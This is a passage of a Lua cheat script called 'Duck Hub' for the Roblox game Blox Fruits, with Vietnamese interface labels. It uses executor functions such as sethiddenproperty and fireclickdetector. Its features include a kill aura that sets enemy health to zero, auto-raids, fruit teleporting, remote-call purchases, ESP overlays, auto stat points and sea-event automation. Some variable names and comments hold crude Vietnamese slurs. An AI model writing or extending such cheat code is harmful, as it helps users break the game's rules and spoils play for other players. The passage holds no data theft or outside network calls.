           game:GetService("VirtualInputManager"):SendKeyEvent(false,"C",false,game)
                                end
                                v.HumanoidRootPart.CanCollide = false
                                v.Head.CanCollide = false
                                v.Humanoid.WalkSpeed = 0          
              sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.huge)
                            until _G.Kill_V4 == false or v.Humanoid.Health <= 0 or not v.Parent or not v:FindFirstChild("HumanoidRootPart") or not v:FindFirstChild("Humanoid")
                            end
                        end
                    end
                end
            end
            )
        end
    end
end
)
local KiuTraiAl = Tabs.Race:AddSection("Use Skill Auto Kill Player Trial")

local Toggle = Tabs.Race:AddToggle("Kill Trial", { Title = "Skill Z", Default = false })
Toggle:OnChanged(function(Ditme)
    _G.ConCacZ = Ditme
end)

local Toggle = Tabs.Race:AddToggle("Kill Trial", { Title = "Skill X", Default = false })
Toggle:OnChanged(function(Lonma)
    _G.ConCacX = Lonma
end)

local Toggle = Tabs.Race:AddToggle("Kill Trial", { Title = "Skill C", Default = false })
Toggle:OnChanged(function(UwU)
    ConCacC = UwU
end)

--Deo Muon Lam Aim Nhung Bang Cach Than Ki Nao Do Fast Attack Deo Pha Noi Ken 🤣
                     ------------Tab Raid Và Random Fruit Và Tele Fruit---------                       
local Dropdown = Tabs.Raid:AddDropdown("DropdownFarm", {
    Title = "Select Chip Raid",
    Values = {"Flame","Ice","Quake","Light","Dark","Spider","Rumble","Magma","Buddha","Sand","Phoenix","Dough"},
    Multi = false,
})

Dropdown:SetValue("Flame")
Dropdown:OnChanged(function(Value)
    SelectChip = Value
end)

local Toggle = Tabs.Raid:AddToggle("Auto Buy Chip", { Title = "Auto Buy Chip", Default = false })
Toggle:OnChanged(function(Value)
    _G.BuyChipRaid = Value
end)
spawn(function()
    while wait() do
		if _G.BuyChipRaid then
			pcall(function()
				local args = {
					[1] = "RaidsNpc",
					[2] = "Select",
					[3] = SelectChip
				}
				game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
			end)
        end
    end
end)

local ToggleAutoStart = Tabs.Raid:AddToggle("ToggleAutoStart", { Title = "Start raid", Default = false })
ToggleAutoStart:OnChanged(function(Value)
    _G.Auto_StartRaid = Value
end)

spawn(function()
    while wait(0.1) do
        pcall(function()
            if _G.Auto_StartRaid then
                if game:GetService("Players")["LocalPlayer"].PlayerGui.Main.Timer.Visible == false then
                    if not game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Island 1") and 
                       (game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Special Microchip") or 
                        game:GetService("Players").LocalPlayer.Character:FindFirstChild("Special Microchip")) then
                        if World2 then
                            fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon2.Button.Main.ClickDetector)
                        elseif World3 then
                            fireclickdetector(game:GetService("Workspace").Map["Boat Castle"].RaidSummon2.Button.Main.ClickDetector)
                        end
                    end
                end
            end
        end)
    end
end)

                     local ToggleNextIsland = Tabs.Raid:AddToggle("ToggleNextIsland", { Title = "Đảo Tiếp Theo", Default = false })
                     ToggleNextIsland:OnChanged(function(Value)
                         _G.ToggleNextIsland = Value
                         StopTween(_G.ToggleNextIsland)
                     end)
                     
                     function IsIslandRaid(cu)
                         if game:GetService("Workspace")["_WorldOrigin"].Locations:FindFirstChild("Island " .. cu) then
                             local min = 4500
                             for r, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
                                 if v.Name == "Island " .. cu and (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < min then
                                     min = (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
                                 end
                             end
                             for r, v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
                                 if v.Name == "Island " .. cu and (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= min then
                                     return v
                                 end
                             end
                         end
                     end
                     
                     function getNextIsland()
                         local TableIslandsRaid = {5, 4, 3, 2, 1}
                         for r, v in pairs(TableIslandsRaid) do
                             if IsIslandRaid(v) and (IsIslandRaid(v).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 4500 then
                                 return IsIslandRaid(v)
                             end
                         end
                     end
                     
                     local ToggleKillAura = Tabs.Raid:AddToggle("Kill Aura", { Title = "Kill Aura", Default = false })
                     ToggleKillAura:OnChanged(function(Value)
                         _G.Kill_Aura = Value
                     end)
                     
                     spawn(function()
                         pcall(function() 
                             while wait() do
                                 if _G.Kill_Aura then
                                     if game:GetService("Players")["LocalPlayer"].PlayerGui.Main.Timer.Visible then
                                         for i, v in pairs(game:GetService("Workspace").Enemies:GetDescendants()) do
                                             if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                 pcall(function()
                                                     repeat wait()
                                                         sethiddenproperty(game:GetService("Players").LocalPlayer, "SimulationRadius", math.huge)
                                                         v.Humanoid.Health = 0
                                                         v.HumanoidRootPart.CanCollide = false
                                                     until not _G.Kill_Aura or not v.Parent or v.Humanoid.Health <= 0
                                                 end)
                                             end
                                         end
                                     end
                                 end
                             end
                         end)
                     end)
                     
                    
if World2 then
Tabs.Raid:AddButton({
    Title = "Teleport To Raid",
    Description = "Bay Đến Chỗ Raid",
    Callback = function()
     topos(CFrame.new(-6502.72559, 249.557404, -4477.06348))    
    end
})       
end    

if World3 then
Tabs.Raid:AddButton({
    Title = "Teleport To Raid",
    Description = "Bay Đến Chỗ Raid",
    Callback = function()
     topos(CFrame.new(-5023.18555, 314.859222, -2840.25366))        
    end
})
end

local Mastery = Tabs.Raid:AddSection("Raid Misc")

Tabs.Raid:AddButton({
    Title = "Buy Chip Law",
    Description = "Mua Chip",
    Callback = function()
    local args = {
       [1] = "BlackbeardReward",
       [2] = "Microchip",
       [3] = "2"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
    end
})

Tabs.Raid:AddButton({
    Title = "Start Raid Law",
    Description = "Bắt Đầu Raid Boss",
    Callback = function()
    fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector)
end
})

local Toggle = Tabs.Raid:AddToggle("Kill Aura", { Title = "Auto Raid Law", Default = false })
Toggle:OnChanged(function(Value)
    _G.Raidlaw = Value
    StopTween(_G.Raidlaw)
end)

spawn(function()
        while wait() do
            if _G.Raidlaw and World2 then
                pcall(function()
                    if game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                        for i,v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
                            if v.Name == "Order" then
                                if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                    repeat task.wait()
                                        AutoHaki()
                                        EquipWeapon(_G.SelectWeapon)
                                        v.HumanoidRootPart.CanCollide = false
                                        v.Humanoid.WalkSpeed = 0
                                        topos(v.HumanoidRootPart.CFrame * Pos)
                                     
                                        sethiddenproperty(game.Players.LocalPlayer,"SimulationRadius",math.huge)
                                    until not _G.Raidlaw or not v.Parent or v.Humanoid.Health <= 0
                                end
                            end
                        end
                    else
                        if game:GetService("ReplicatedStorage"):FindFirstChild("Order") then
                            topos(game:GetService("ReplicatedStorage"):FindFirstChild("Order").HumanoidRootPart.CFrame * CFrame.new(2,20,2))
                        else
                            if  _G.AutoOderSwordHop then
                                Hop()
                            end
                        end
                    end
                end)
            end
        end
    end)

local Mastery = Tabs.Raid:AddSection("Teleport Fruit")
local Toggle = Tabs.Raid:AddToggle("Store Fruit", { Title = "Store Fruit", Default = false })
Toggle:OnChanged(function(Value)
    getgenv().AutoStoreFruits = Value
end)

local function Get_Fruit(Fruit)
  if Fruit == "Rocket Fruit" then
    return "Rocket-Rocket"
  elseif Fruit == "Spin Fruit" then
    return "Spin-Spin"
  elseif Fruit == "Chop Fruit" then
    return "Chop-Chop"
  elseif Fruit == "Spring Fruit" then
    return "Spring-Spring"
  elseif Fruit == "Bomb Fruit" then
    return "Bomb-Bomb"
  elseif Fruit == "Smoke Fruit" then
    return "Smoke-Smoke"
  elseif Fruit == "Spike Fruit" then
    return "Spike-Spike"
  elseif Fruit == "Flame Fruit" then
    return "Flame-Flame"
  elseif Fruit == "Falcon Fruit" then
    return "Falcon-Falcon"
  elseif Fruit == "Ice Fruit" then
    return "Ice-Ice"
  elseif Fruit == "Sand Fruit" then
    return "Sand-Sand"
  elseif Fruit == "Dark Fruit" then
    return "Dark-Dark"
  elseif Fruit == "Ghost Fruit" then
    return "Ghost-Ghost"
  elseif Fruit == "Diamond Fruit" then
    return "Diamond-Diamond"
  elseif Fruit == "Light Fruit" then
    return "Light-Light"
  elseif Fruit == "Rubber Fruit" then
    return "Rubber-Rubber"
  elseif Fruit == "Barrier Fruit" then
    return "Barrier-Barrier"
  elseif Fruit == "Magma Fruit" then
    return "Magma-Magma"
  elseif Fruit == "Quake Fruit" then
    return "Quake-Quake"
  elseif Fruit == "Buddha Fruit" then
    return "Buddha-Buddha"
  elseif Fruit == "Love Fruit" then
    return "Love-Love"
  elseif Fruit == "Spider Fruit" then
    return "Spider-Spider"
  elseif Fruit == "Sound Fruit" then
    return "Sound-Sound"
  elseif Fruit == "Phoenix Fruit" then
    return "Phoenix-Phoenix"
  elseif Fruit == "Portal Fruit" then
    return "Portal-Portal"
  elseif Fruit == "Rumble Fruit" then
    return "Rumble-Rumble"
  elseif Fruit == "Pain Fruit" then
    return "Pain-Pain"
  elseif Fruit == "Blizzard Fruit" then
    return "Blizzard-Blizzard"
  elseif Fruit == "Gravity Fruit" then
    return "Gravity-Gravity"
  elseif Fruit == "Mammoth Fruit" then
    return "Mammoth-Mammoth"
  elseif Fruit == "Dough Fruit" then
    return "Dough-Dough"
  elseif Fruit == "Shadow Fruit" then
    return "Shadow-Shadow"
  elseif Fruit == "Venom Fruit" then
    return "Venom-Venom"
  elseif Fruit == "Control Fruit" then
    return "Control-Control"
  elseif Fruit == "Spirit Fruit" then
    return "Spirit-Spirit"
  elseif Fruit == "Dragon Fruit" then
    return "Dragon-Dragon"
  elseif Fruit == "Leopard Fruit" then
    return "Leopard-Leopard"
  end
end

local Players = game:GetService("Players")
local Player = Players.LocalPlayer

task.spawn(function()
  while getgenv().AutoStoreFruits do task.wait()
    pcall(function()
      local plrBag = Player.Backpack
      local plrChar = Player.Character
      for _,Fruit in pairs(plrChar:GetChildren()) do
        if Fruit:IsA("Tool") and Fruit:FindFirstChild("Fruit") then
          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit", Get_Fruit(Fruit.Name), Fruit)
        end
      end
      for _,Fruit in pairs(plrBag:GetChildren()) do
        if Fruit:IsA("Tool") and Fruit:FindFirstChild("Fruit") then
          game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("StoreFruit", Get_Fruit(Fruit.Name), Fruit)
        end
      end
    end)
  end
end)

local Toggle = Tabs.Raid:AddToggle("Teleport Fruit", { Title = "Teleport Fruit", Default = false })
Toggle:OnChanged(function(Value)
    _G.Tweenfruit = Value
    StopTween(_G.Tweenfruit)
end)
    
spawn(function()
    while wait(.1) do
        if _G.Tweenfruit then
            for i,v in pairs(game.Workspace:GetChildren()) do
                if string.find(v.Name, "Fruit") then
                    topos(v.Handle.CFrame)
                end
            end
        end
    end
end)
-----Shop Melee-----
local Dropdown = Tabs.Melee:AddDropdown("DropdownMelee", {
    Title = "Mua Melee",
    Values = {"Black Leg", "Electro", "Fishman Karate", "Dragon Claw", "Super Human", "Death Step", "Sharkman Karate", "Electric Claw", "Dragon Talon", "God Human","Sanguine Art"},
    Multi = false,
})

Dropdown:OnChanged(function(Value)
    _G.Select_Melee = Value
    if Value == "Black Leg" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBlackLeg")
    elseif Value == "Electro" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectro")
    elseif Value == "Fishman Karate" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyFishmanKarate")
    elseif Value == "Dragon Claw" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "1")
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BlackbeardReward", "DragonClaw", "2")
    elseif Value == "Super Human" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySuperhuman")
    elseif Value == "Death Step" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDeathStep")
    elseif Value == "Sharkman Karate" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate", true)
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuySharkmanKarate")
    elseif Value == "Electric Claw" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyElectricClaw")
    elseif Value == "Dragon Talon" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyDragonTalon")
    elseif Value == "God Human" then
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyGodhuman")
    elseif Value == "Sanguine Art" then
    local args = {
        [1] = "BuySanguineArt"
    }
    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
end
end)

Tabs.Melee:AddButton({
    Title = "Buy Race Ghoul",
    Description = "Mua Tộc Quỷ",
    Callback = function()
    local a = {
            [1] = "Ectoplasm",
            [2] = "BuyCheck",
            [3] = 4
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(a))
        local a = {
            [1] = "Ectoplasm",
            [2] = "Change",
            [3] = 4
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(a))
    end    
})
        
Tabs.Melee:AddButton({
    Title = "Buy Race Cyrborg",
    Description = "Mua Tộc Người Máy",
    Callback = function()
    local a = {
            [1] = "CyborgTrainer",
            [2] = "Buy"
        }
        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(a))
    end    
})
Tabs.St:AddSection("Status")
local lvParagraph
lvParagraph = Tabs.St:AddParagraph({
	Title = "Your Status",
	Content = ""
})
spawn(function()
	while wait() do
		pcall(function()
			local statusText = string.format("Level: %d\nBeli: %d\nFragments: %d\nRace: %s",
				game:GetService("Players").LocalPlayer.Data.Level.Value,
				game:GetService("Players").LocalPlayer.Data.Beli.Value,
				game:GetService("Players").LocalPlayer.Data.Fragments.Value,
				game:GetService("Players").LocalPlayer.Data.Race.Value
			)
			lvParagraph:SetDesc(statusText)
		end)
	end
end)
    local foldername = "Duck Hub"
    local filename = foldername.."/Setting.json"
    function saveSettings()
        local HttpService = game:GetService("HttpService")
        local json = HttpService:JSONEncode(_G)
        if true then
            if isfolder(foldername) then
                if isfile(filename) then
                    writefile(filename, json)
                else
                    writefile(filename, json)
                end
            else
                makefolder(foldername)
            end
        end
    end
    ------------------------------------------------------------------------------------------------------------------------------------
    ------------------------------------------------------------------------------------------------------------------------------------
    
    function loadSettings()
        local HttpService = game:GetService("HttpService")
        if isfolder(foldername) then
            if isfile(filename) then
                _G = HttpService:JSONDecode(readfile(filename))
            end
        end
    end
Tabs.St:AddSection("Auto Up Status Player")
ToggleMelee = Tabs.St:AddToggle("ToggleMelee", {Title = "Auto Melee",Description = "Nâng mele", Default = _G.Auto_Stats_Melee })
ToggleMelee:OnChanged(function(Value)
	_G.Auto_Stats_Melee = Value
	saveSettings()
end)
ToggleDe = Tabs.St:AddToggle("ToggleDe", {Title = "Auto Defense",Description = "Nâng máu", Default = _G.Auto_Stats_Defense })
ToggleDe:OnChanged(function(Value)
	_G.Auto_Stats_Defense = Value
	saveSettings()
end)
ToggleSword = Tabs.St:AddToggle("ToggleSword", {Title = "Auto Sword",Description = "Nâng sword", Default = _G.Auto_Stats_Sword })
ToggleSword:OnChanged(function(Value)
	_G.Auto_Stats_Sword = Value
	saveSettings()
end)
ToggleGun = Tabs.St:AddToggle("ToggleGun", {Title = "Auto Gun", Description = "Nâng súng",Default = _G.Auto_Stats_Gun })
ToggleGun:OnChanged(function(Value)
	_G.Auto_Stats_Gun = Value
	saveSettings()
end)
ToggleFruit = Tabs.St:AddToggle("ToggleFruit", {Title = "Auto Demon Fruit",Description = "", Default = _G.Auto_Stats_Devil_Fruit })
ToggleFruit:OnChanged(function(Value)
	_G.Auto_Stats_Devil_Fruit = Value
	saveSettings()
end)
spawn(function()
	while wait() do
		if _G.Auto_Stats_Devil_Fruit then
			local args = {
				[1] = "AddPoint",
				[2] = "Demon Fruit",
				[3] = 3
			}
			game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
		end
	end
end)
spawn(function()
	while wait() do
		if _G.Auto_Stats_Gun then
			local args = {
				[1] = "AddPoint",
				[2] = "Gun",
				[3] = 3
			}
			game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
		end
	end
end)
spawn(function()
	while wait() do
		if _G.Auto_Stats_Sword then
			local args = {
				[1] = "AddPoint",
				[2] = "Sword",
				[3] = 3
			}
			game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
		end
	end
end)
spawn(function()
	while wait() do
		if _G.Auto_Stats_Defense then
			local args = {
				[1] = "AddPoint",
				[2] = "Defense",
				[3] = 3
			}
			game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
		end
	end
end)
spawn(function()
	while wait() do
		if _G.Auto_Stats_Melee then
			local args = {
				[1] = "AddPoint",
				[2] = "Melee",
				[3] = 3
			}
			game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
		end
	end
end)
ToggleEspKitsune = Tabs.cailon:AddToggle("ToggleEspKitsune", {Title = "Esp Kitsune Island",Description = "", Default = false })
ToggleEspKitsune:OnChanged(function(Value)
    KitsuneIslandEsp = Value
    while KitsuneIslandEsp do wait()
        UpdateIslandKisuneESP() 
    end
end)

function UpdateIslandKisuneESP() 
    for i,v in pairs(game:GetService("Workspace")["_WorldOrigin"].Locations:GetChildren()) do
        pcall(function()
            if KitsuneIslandEsp then 
                if v.Name == "Kitsune Island" then
                    if not v:FindFirstChild('NameEsp') then
                        local bill = Instance.new('BillboardGui',v)
                        bill.Name = 'NameEsp'
                        bill.ExtentsOffset = Vector3.new(0, 1, 0)
                        bill.Size = UDim2.new(1,200,1,30)
                        bill.Adornee = v
                        bill.AlwaysOnTop = true
                        local name = Instance.new('TextLabel',bill)
                        name.Font = "Code"
                        name.FontSize = "Size14"
                        name.TextWrapped = true
                        name.Size = UDim2.new(1,0,1,0)
                        name.TextYAlignment = 'Top'
                        name.BackgroundTransparency = 1
                        name.TextStrokeTransparency = 0.5
                        name.TextColor3 = Color3.fromRGB(80, 245, 245)
                    else
                        v['NameEsp'].TextLabel.Text = (v.Name ..'   \n'.. round((game:GetService('Players').LocalPlayer.Character.Head.Position - v.Position).Magnitude/3) ..' M')
                    end
                end
            else
                if v:FindFirstChild('NameEsp') then
                    v:FindFirstChild('NameEsp'):Destroy()
                end
            end
        end)
    end
end

ToggleTPKitsune = Tabs.cailon:AddToggle("ToggleTPKitsune", {Title = "Tween To Kitsune Island",Description = "", Default = _G.TweenToKitsune })
ToggleTPKitsune:OnChanged(function(Value)
    _G.TweenToKitsune = Value
    saveSettings()
end)
spawn(function()
    local kitsuneIsland
    while not kitsuneIsland do
        kitsuneIsland = game:GetService("Workspace").Map:FindFirstChild("KitsuneIsland")
        wait(1)
    end
    while wait() do
        if _G.TweenToKitsune then
            local shrineActive = kitsuneIsland:FindFirstChild("ShrineActive")
            if shrineActive then
                for _, v in pairs(shrineActive:GetDescendants()) do
                    if v:IsA("BasePart") and v.Name:find("NeonShrinePart") then
                        TP2(v.CFrame)
                    end
                end
            end
        end
    end
end)


ToggleCollectAzure = Tabs.cailon:AddToggle("ToggleCollectAzure", {Title = "Collect Azure Amber",Description = "", Default = _G.CollectAzure })
ToggleCollectAzure:OnChanged(function(Value)
    _G.CollectAzure = Value
    saveSettings()
end)
spawn(function()
    while wait() do
        if _G.CollectAzure then
            pcall(function()
                if game:GetService("Workspace"):FindFirstChild("AttachedAzureEmber") then
                    TP2(game:GetService("Workspace"):WaitForChild("EmberTemplate"):FindFirstChild("Part").CFrame)
                    print("qua r ne")
                end
            end)
        end
    end
end)
end
local seaevent = Tabs.Se:AddSection("Sea Event")
Tabs.Se:AddButton({
	Title = "Remove Fog",
	Description = "",
	Callback = function()            
		game:GetService("Lighting").LightingLayers:Destroy()
		game:GetService("Lighting").Sky:Destroy()
	end
})

local ListSeaBoat = {
	"Guardian",
	"PirateGrandBrigade",
	"MarineGrandBrigade",
	"PirateBrigade",
	"MarineBrigade",
	"PirateSloop",
	"MarineSloop",
	"BeastHunter",
}

local ListSeaZone = {
	"Zone 1",
	"Zone 2",
	"Zone 3",
	"Zone 4",
	"Zone 5",
	"Zone 6",
}

local selectthuyen = Tabs.Se:AddDropdown("selectthuyen", {
	Title = "Select Boat",
	Values = ListSeaBoat,
	Multi = false,
	Default = _G.SelectedBoat,
})

selectthuyen:OnChanged(function(value)
	_G.SelectedBoat = value
	saveSettings()
end)
print("queue")
local zoneselect = Tabs.Se:AddDropdown("zoneselect", {
	Title = "Zone Select",
	Values = ListSeaZone,
	Multi = false,
	Default = _G.SelectedZone,
})

zoneselect:OnChanged(function(value)
	_G.SelectedZone = value
	saveSettings()
end)

local boattween = Tabs.Se:AddDropdown("boattween", {
	Title = "Speed Tween Boat",
	Values = {"180", "200", "250", "300", "325", "350"},
	Multi = false,
	Default = 300,
})
boattween:SetValue("300")
boattween:OnChanged(function(Value)
	getgenv().SpeedBoat = Value
end)

spawn(function()
	pcall(function()
		while wait() do
			if _G.SelectedZone == "Zone 1" then
				CFrameSelectedZone = CFrame.new(-21998.375, 30.0006084, -682.309143, 0.120013528, 0.00690158736, 0.99274826, -0.0574118942, 0.998350561, -2.36509201e-10, -0.991110802, -0.0569955558, 0.120211802)
			elseif _G.SelectedZone == "Zone 2" then
				CFrameSelectedZone = CFrame.new(-26779.5215, 30.0005474, -822.858032, 0.307457417, 0.019647358, 0.951358974, -0.0637726262, 0.997964442, -4.15334017e-10, -0.949422479, -0.0606706589, 0.308084518)
			elseif _G.SelectedZone == "Zone 3" then
				CFrameSelectedZone = CFrame.new(-31171.957, 30.0001011, -2256.93774, 0.37637493, 0.0150483791, 0.926345229, -0.0399504974, 0.999201655, 2.70896673e-11, -0.925605655, -0.0370079502, 0.376675636)
			elseif _G.SelectedZone == "Zone 4" then
				CFrameSelectedZone = CFrame.new(-34054.6875, 30.2187767, -2560.12012, 0.0935864747, -0.00122954219, 0.995610416, 0.0624034069, 0.998040259, -0.00463332096, -0.993653536, 0.062563099, 0.0934797972)
			elseif _G.SelectedZone == "Zone 5" then
				CFrameSelectedZone = CFrame.new(-38887.5547, 30.0004578, -2162.99023, -0.188895494, -0.00704088295, 0.981971979, -0.0372481011, 0.999306023, -1.39882339e-09, -0.981290519, -0.0365765914, -0.189026669)
			elseif _G.SelectedZone == "Zone 6" then
				CFrameSelectedZone = CFrame.new(-44541.7617, 30.0003204, -1244.8584, -0.0844199061, -0.00553312758, 0.9964149, -0.0654025897, 0.997858942, 2.02319411e-10, -0.99428153, -0.0651681125, -0.0846010372)
			end
		end
	end)
end)
print("start")
local startseaevent = Tabs.Se:AddToggle("startseaevent", {Title = "Start Sea Event",Description = "Click this toggle for start sea event warning: enable toggle kill mob you want", Default = _G.SailBoat })
startseaevent:OnChanged(function(state)
	_G.SailBoat = state
end)

function CheckBoat()
	for i, v in pairs(game:GetService("Workspace").Boats:GetChildren()) do
		if v.Name == _G.SelectedBoat then
			for _, child in pairs(v:GetChildren()) do
				if child.Name == "MyBoatEsp" then
					return v
				end
			end
		end
	end
	return false
end

function CheckEnemiesBoat()
	if (game:GetService("Workspace").Enemies:FindFirstChild("FishBoat") or game:GetService("Workspace").Enemies:FindFirstChild("PirateBrigade") or game:GetService("Workspace").Enemies:FindFirstChild("PirateGrandBrigade")) then
		return true
	end
	return false
end

function CheckShark()
	for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
		if v.Name == "Shark" and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
			if game:GetService("Workspace").Enemies:FindFirstChild("Shark") then
				if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 200 then
					return true
				end
			end
		end
	end
	return false
end

function CheckPiranha()
	for i, v in pairs(game:GetService("Workspace").Enemies:GetChildren()) do
		if v.Name == "Piranha" and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
			if game:GetService("Workspace").Enemies:FindFirstChild("Piranha") then
				if (v.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 200 then
					return true
				end
			end
		end
	end
	return false
end


function AddEsp(Name, Parent)
	local BillboardGui = Instance.new("BillboardGui")
	local TextLabel = Instance.new("TextLabel")

	BillboardGui.Parent = Parent
	BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	BillboardGui.Active = true
	BillboardGui.Name = Name
	BillboardGui.AlwaysOnTop = true
	BillboardGui.LightInfluence = 1.000
	BillboardGui.Size = UDim2.new(0, 200, 0, 50)
	BillboardGui.StudsOffset = Vector3.new(0, 2.5, 0)

	TextLabel.Parent = BillboardGui
	TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.BackgroundTransparency = 1.000
	TextLabel.Size = UDim2.new(1, 0, 1, 0)
	TextLabel.Font = Enum.Font.GothamBold
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextSize = 15
	TextLabel.Text = "YOUR BOAT HERE ↓"
end


spawn(function()
	while wait() do
		pcall(function()
			if _G.SailBoat then
				if not CheckBoat() then
					local BuyBoatCFrame = CFrame.new(-16927.451171875, 9.0863618850708, 433.8642883300781)
					if (BuyBoatCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 1000 then
						BTP(BuyBoatCFrame)
					else
						stoppos = TP2(BuyBoatCFrame)
					end
					if (CFrame.new(-16927.451171875, 9.0863618850708, 433.8642883300781).Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 10 then
						if stoppos then stoppos:Stop() end
						game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyBoat", _G.SelectedBoat)
						for i, v in pairs(game:GetService("Workspace").Boats:GetChildren()) do
							if v.Name == _G.SelectedBoat then
								if (v.VehicleSeat.CFrame.Position - game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 100 then
									AddEsp('MyBoatEsp', v)
								end
							end
						end
					end
				else
					for i, v in pairs(game:GetService("Workspace").Boats:GetChildren()) do
						if v.Name == _G.SelectedBoat then
							if v:FindFirstChild("MyBoatEsp") then
								if not game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit then
									if ((CheckShark() and _G.AutoKillShark) or (game:GetService("Workspace").Enemies:FindFirstChild("Terrorshark") and _G.AutoTerrorshark) or (CheckPiranha() and _G.AutoKillPiranha) or (game:GetService("Workspace").Enemies:FindFirstChild("Fish Crew Member") and _G.AutoKillFishCrew) or (game:GetService("Workspace").Enemies:FindFirstChild("FishBoat") and _G.RelzFishBoat) or (game:GetService("Workspace").Enemies:FindFirstChild("PirateBrigade") and _G.RelzPirateBrigade) or (game:GetService("Workspace").Enemies:FindFirstChild("PirateGrandBrigade") and _G.RelzPirateGrandBrigade) or (CheckSeaBeast() and _G.AutoSeaBest)) then
										if stoppos then stoppos:Stop() end
									else
										stoppos = TP2(v.VehicleSeat.CFrame * CFrame.new(0, 1, 0))
									end
								else
									repeat wait()
										stopboat = TPB(CFrameSelectedZone, v.VehicleSeat)
									until ((CheckShark() and _G.AutoKillShark) or (game:GetService("Workspace").Enemies:FindFirstChild("Terrorshark") and _G.AutoTerrorshark) or (CheckPiranha() and _G.AutoKillPiranha) or (game:GetService("Workspace").Enemies:FindFirstChild("Fish Crew Member") and _G.AutoKillFishCrew) or (game:GetService("Workspace").Enemies:FindFirstChild("FishBoat") and _G.RelzFishBoat) or (game:GetService("Workspace").Enemies:FindFirstChild("PirateBrigade") and _G.RelzPirateBrigade) or (game:GetService("Workspace").Enemies:FindFirstChild("PirateGrandBrigade") and _G.RelzPirateGrandBrigade) or (CheckSeaBeast() and _G.AutoSeaBest)) or not game.Players.LocalPlayer.Character:WaitForChild("Humanoid").Sit or not _G.SailBoat
									if stopboat then stopboat:Stop() end
									game:GetService("VirtualInputManager"):SendKeyEvent(true, 32, false, game)
									wait(0.1)
									game:GetService("VirtualInputManager"):SendKeyEvent(false, 32, false, game)
								end
							end
						end
					end
				end
			end
		end)
	end
end)

spawn(function()
	pcall(function()
		while wait() do
			if _G.SailBoat then
				if ((CheckShark() and _G.AutoKillShark) or (game:GetService("Workspace").Enemies:FindFirstChild("Terrorshark") and _G.AutoTerrorshark) or (CheckPiranha() and _G.AutoKillPiranha) or (game:GetService("Workspace").Enemies:FindFirstChild("Fish Crew Member") and _G.AutoKillFishCrew) or (game:GetService("Workspace").Enemies:FindFirstChild("FishBoat") and _G.RelzFishBoat) or (game:GetService("Workspace").Enemies:FindFirstChild("PirateBrigade") and _G.RelzPirateBrigade) or (game:GetService("Workspace").Enemies:FindFirstChild("PirateGrandBrigade") and _G.RelzPirateGrandBrigade) or (CheckSeaBeast() and _G.AutoSeaBest)) then
					if game.Players.LocalPlayer.Character.Humanoid.Sit == true then
						game:GetService("VirtualInputManager"):SendKeyEvent(true, 32, false, game)
						wait(0.1)
